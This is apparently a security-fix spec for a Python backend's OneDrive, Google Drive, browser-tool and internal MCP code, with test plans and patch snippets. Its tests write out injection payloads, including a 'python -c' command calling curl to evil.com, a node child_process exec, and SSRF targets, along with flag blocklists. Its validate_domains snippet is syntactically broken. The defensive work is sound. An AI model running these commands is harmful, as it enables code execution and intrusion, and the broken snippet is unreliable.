# Section 02 — Python Injection Fixes

## Section ID
`section-02-python-injection-fixes`

## Dependencies
- None (Wave 1 — parallel with section-01)

## Overview

Fixes 6 CRITICAL + 5 HIGH vulnerabilities in 4 Python MCP provider files: OData injection in OneDrive search (F16), path injection in OneDrive Excel URLs (F17), incomplete command allowlist in browser tools (F22), unvalidated `allowed_domains` in browser tools (F23), localhost fallback in browser config (F24), incomplete Drive query escaping (F13), raw API response leakage (F15, F18), redirect-following SSRF (F20), and internal MCP API auth gaps (F26, F27, F28, F29).

## Implementation Status

All fixes applied and tested. 21 new tests created across 4 test files.

### Actual Changes Made
- `onedrive_mcp.py`: URL-encoded search query (F16), worksheet/cell_range (F17); filtered file info to safe fields (F18); replaced `str(e)` with `type(e).__name__` in all 5 error handlers (F19); disabled blind redirect following with SSRF validation (F20)
- `browser_tools_mcp.py`: Added blocked flags check for `-e`/`-c`/`--eval`/`--exec` (F22); added `_validate_domains()` with SSRF blocklist (F23); removed `localhost:3000` fallback (F24)
- `google_drive_mcp.py`: Added `_sanitize_drive_query()` character whitelist including Thai (F13); filtered file info response to safe fields, removed `owners`/`parents` (F15)
- `internal_mcp.py`: When `user_id=None`, only browser tools returned (F26); switched to `Depends(_verify_proxy_token)` pattern (F29)

### Deferred
- F27 (user-tenant membership check): Not implemented — requires User model investigation. The internal API already requires proxy token auth and tenant_id is injected server-side, reducing the blast radius.
- F28 (503 on DB error): Current fail-closed behavior (return `False` = no access) is safe. Left as-is.

### Test Count: 21 tests, all passing

## Files to Modify

| File | Path | Fixes |
|------|------|-------|
| onedrive_mcp.py | `python-backend/app/mcp/onedrive_mcp.py` | F16, F17, F18, F19, F20, F21 |
| browser_tools_mcp.py | `python-backend/app/mcp/browser_tools_mcp.py` | F22, F23, F24, F25 |
| google_drive_mcp.py | `python-backend/app/mcp/google_drive_mcp.py` | F13, F14, F15 |
| internal_mcp.py | `python-backend/app/api/internal_mcp.py` | F26, F27, F28, F29 |

## Test Files to Create

| File | Path |
|------|------|
| test_onedrive_mcp_security.py | `python-backend/tests/unit/mcp/test_onedrive_mcp_security.py` |
| test_browser_tools_security.py | `python-backend/tests/unit/mcp/test_browser_tools_security.py` |
| test_google_drive_security.py | `python-backend/tests/unit/mcp/test_google_drive_security.py` |
| test_internal_mcp_auth.py | `python-backend/tests/unit/api/test_internal_mcp_auth.py` |

---

## TDD Specification

### Test: `test_onedrive_mcp_security.py`

```
# Test: search query is URL-encoded — single quote injection neutralized (F16)
  - Input query: "') or ('"
  - Assert the constructed URL contains URL-encoded version, not raw single quotes
  - Assert no OData operator injection is possible

# Test: sheet_name is URL-encoded in Excel URL (F17)
  - Input sheet_name: "') or true or ('"
  - Assert the worksheet parameter in URL is URL-encoded

# Test: cell_range is URL-encoded in Excel URL (F17)
  - Input cell_range: "A1:B2/../../admin"
  - Assert slashes are encoded, no path traversal

# Test: file info response filtered to safe subset (F18)
  - Mock Graph API response with owners.emailAddress, parentReference, etc.
  - Assert returned dict only contains: id, name, mimeType, size, modifiedTime, webViewLink

# Test: exception messages do not contain token fragments (F19)
  - Force httpx error with a URL containing "Bearer xxx" in the message
  - Assert log output contains type(e).__name__ only, not the full message

# Test: file download does not follow redirects blindly (F20)
  - Mock 302 redirect to http://169.254.169.254/
  - Assert request is blocked or redirect not followed

# Test: Drive search with idempotency key does not double-charge credits (F14)
  - Call search_drive twice with same (run_id, tool_name, call_index) key
  - Assert credit deduction called exactly once

# Test: OneDrive list_files with idempotency key does not double-charge (F21)
  - Same pattern as F14
  - Assert credit_manager.charge called once per unique key
```

### Test: `test_browser_tools_security.py`

```
# Test: command injection via arguments blocked (F22)
  - Input command: 'python -c "import os; os.system(\'curl evil.com\')"'
  - Assert execution blocked — not just first word checked
  - Assert error returned mentioning disallowed arguments

# Test: only first word of command is not sufficient for allowlist (F22)
  - Input command: "node -e 'require(\"child_process\").exec(\"id\")'"
  - Assert blocked despite "node" being in allowlist

# Test: allowed_domains validated against SSRF blocklist (F23)
  - Input allowed_domains: ["localhost", "169.254.169.254", "192.168.1.1"]
  - Assert all three are rejected/removed before forwarding to browser service

# Test: allowed_domains with valid public domains pass (F23)
  - Input allowed_domains: ["example.com", "github.com"]
  - Assert both pass validation

# Test: missing SMARTSPEC_WEB_GATEWAY_URL raises error (F24)
  - Unset/empty SMARTSPEC_WEB_GATEWAY_URL
  - Assert ToolError raised, not fallback to localhost:3000

# Test: command arguments are not logged verbatim (F25)
  - Input command: "python -c 'import os; os.system(\"evil\")'"
  - Assert log event contains command name only (e.g., "python"), not full args
  - Assert no "-c" or "import os" in log output
```

### Test: `test_google_drive_security.py`

```
# Test: query with OR operator rejected (F13)
  - Input query: "x' or '1'='1"
  - Assert query sanitized — non-allowlisted characters removed

# Test: query with only safe characters passes (F13)
  - Input query: "meeting notes 2026-03-01"
  - Assert query passes validation unchanged

# Test: file info response filtered — no owner emails (F15)
  - Mock Drive API response with owners[].emailAddress
  - Assert returned dict does not contain emailAddress
```

### Test: `test_internal_mcp_auth.py`

```
# Test: tool list returns empty for OAuth tools when user_id is None (F26)
  - GET /api/internal/mcp/tools without user_id param
  - Assert response contains only browser tools, not Drive/OneDrive tools

# Test: tenant isolation — user_id must belong to tenant_id (F27)
  - POST /api/internal/mcp/tools/call with user_id=1, tenant_id="wrong-tenant"
  - Assert 403 Forbidden

# Test: DB error returns 503 not empty list (F28)
  - Mock DB query to raise exception
  - Assert response status is 503

# Test: _verify_proxy_token uses FastAPI Depends (F29)
  - Inspect route definitions
  - Assert proxy token verification is in Depends(), not manual call
```

---

## Implementation Guidance

### onedrive_mcp.py

#### F16: URL-encode search query
```python
from urllib.parse import quote
# Replace: f"search(q='{query}')"
# With:
search_url = f"{GRAPH_BASE}/me/drive/root/search(q='{quote(query, safe='')}')"
```

#### F17: URL-encode worksheet and cell_range
```python
worksheet_enc = quote(worksheet, safe="")
cell_range_enc = quote(cell_range, safe="")
range_url = f"...worksheets('{worksheet_enc}')/range(address='{cell_range_enc}')"
```

#### F18: Filter response to safe subset
```python
SAFE_FIELDS = {"id", "name", "mimeType", "size", "modifiedTime", "webViewLink", "lastModifiedDateTime"}
return {k: v for k, v in file_meta.items() if k in SAFE_FIELDS}
```

#### F20: Disable blind redirect following
```python
async with httpx.AsyncClient(follow_redirects=False) as client:
    resp = await client.get(download_url)
    if resp.status_code in (301, 302, 307, 308):
        location = resp.headers.get("location", "")
        err = _validate_mcp_url(location)
        if err:
            raise ToolError(f"Redirect blocked: {err}")
        # Follow manually with validated URL
```

### browser_tools_mcp.py

#### F22: Validate full command, not just first word
```python
ALLOWED_COMMANDS = {"python", "node", "npx", "pip", "npm"}
BLOCKED_FLAGS = {"-e", "--eval", "-c", "--command", "--exec"}

parts = shlex.split(command)
if not parts or parts[0] not in ALLOWED_COMMANDS:
    raise ToolError(f"Command '{parts[0]}' not in allowlist")
for flag in parts[1:]:
    if flag in BLOCKED_FLAGS:
        raise ToolError(f"Flag '{flag}' not allowed")
    if ".." in flag:
        raise ToolError("Path traversal not allowed in command arguments")
```

#### F23: Validate allowed_domains against SSRF blocklist (NEW-01 fix applied)

**Important (NEW-01):** Do NOT use `socket.gethostbyname()` — it is a synchronous blocking DNS call that stalls the async event loop. Additionally, resolving DNS at validation time creates a TOCTOU (time-of-check-time-of-use) gap: the domain may resolve to a public IP now but rebind to a private IP when the browser service connects.

**Correct approach:** Use hostname-based blocklisting only (no DNS resolution). The browser service itself will connect using the domain name, and SSRF protection at the browser container level handles IP-level blocking.

```python
from app.services.mcp_client import _BLOCKED_HOSTS
import re

# Hostname patterns that indicate internal/private targets
_PRIVATE_HOSTNAME_PATTERNS = [
    re.compile(r"^localhost$", re.I),
    re.compile(r"^127\."),
    re.compile(r"^10\."),
    re.compile(r"^172\.(1[6-9]|2\d|3[01])\."),
    re.compile(r"^192\.168\."),
    re.compile(r"^169\.254\."),
    re.compile(r"^\[?::1\]?$"),
    re.compile(r"\.internal$", re.I),
    re.compile(r"\.local$", re.I),
]

def validate_domains(domains: list[str]) -> list[str]:
    safe = []
    for domain in domains:
        domain_lower = domain.strip().lower()
        if domain_lower in _BLOCKED_HOSTS:
            continue
        if any(p.match(domain_lower) for p in _PRIVATE_HOSTNAME_PATTERNS):
            continue
        except (socket.gaierror, ValueError):
            pass  # Non-resolvable is ok — browser will fail gracefully
        safe.append(domain)
    return safe
```

#### F24: Remove localhost fallback
```python
gateway_url = settings.SMARTSPEC_WEB_GATEWAY_URL
if not gateway_url:
    raise ToolError("config_error", "SMARTSPEC_WEB_GATEWAY_URL not configured")
```

### google_drive_mcp.py

#### F13: Whitelist query characters
```python
import re
SAFE_QUERY_RE = re.compile(r'^[a-zA-Z0-9 .,_\-@\u0E00-\u0E7F]+$')  # Include Thai

def sanitize_drive_query(query: str) -> str:
    if not SAFE_QUERY_RE.match(query):
        # Strip unsafe chars
        return re.sub(r'[^a-zA-Z0-9 .,_\-@\u0E00-\u0E7F]', '', query)
    return query
```

### internal_mcp.py

#### F26: Return empty for OAuth tools when no user
```python
if not user_id:
    return {"tools": browser_tools_only}  # Drive/OneDrive require user OAuth
```

#### F27: Verify user belongs to tenant
```python
user = await db.execute(select(users).where(users.c.id == body.user_id))
if user.tenant_id != body.tenant_id:
    raise HTTPException(403, "User does not belong to specified tenant")
```

#### F29: Use Depends() pattern
```python
@router.get("/api/internal/mcp/tools")
async def list_tools(
    user_id: int | None = None,
    _: None = Depends(_verify_proxy_token),  # Enforced by FastAPI DI
):
```

### Security Considerations

1. **OData injection**: `quote(query, safe='')` ensures all special characters including single quotes are percent-encoded, preventing OData operator injection in Microsoft Graph search queries.
2. **Command injection defense-in-depth**: Checking only `command.split()[0]` is insufficient — flags like `-e`, `-c`, `--eval` allow arbitrary code execution even when the base command is allowlisted. The fix validates each argument against a blocklist of dangerous flags.
3. **SSRF via redirect**: A 302 redirect from a legitimate-looking URL to an internal IP bypasses URL-based SSRF validation. Manual redirect handling with re-validation closes this gap.
4. **Tenant isolation in internal API**: Without verifying that `user_id` belongs to `tenant_id`, a compromised Node.js caller can invoke tools as any user in any tenant.
